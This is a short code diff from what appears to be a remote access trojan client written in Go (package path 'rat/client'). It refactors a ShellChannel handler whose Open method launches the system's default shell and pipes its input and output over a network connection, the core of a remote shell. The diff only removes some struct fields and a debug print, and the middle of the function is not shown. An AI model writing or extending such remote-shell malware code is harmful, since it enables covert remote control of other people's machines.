@@ -2,18 +2,14 @@ package main
 
 import (
 	"bufio"
-	"fmt"
 	"io"
 	"os/exec"
 	"rat/client/shell"
 )
 
-type ShellChannel struct {
-	Action int    `network:"receive"`
-	Data   string `network:"send,receive"`
-}
+type ShellChannel struct{}
 
-func (packet ShellChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
+func (ShellChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
 	cmd := exec.Command(shell.GetDefault())
 	stdin, _ := cmd.StdinPipe()
 	stdout, _ := cmd.StdoutPipe()
@@ -51,8 +47,6 @@ func (packet ShellChannel) Open(channel io.ReadWriteCloser, c *Connection) error
 			break
 		}
 	}
-
-	fmt.Println("end")
 
 	return err
 }
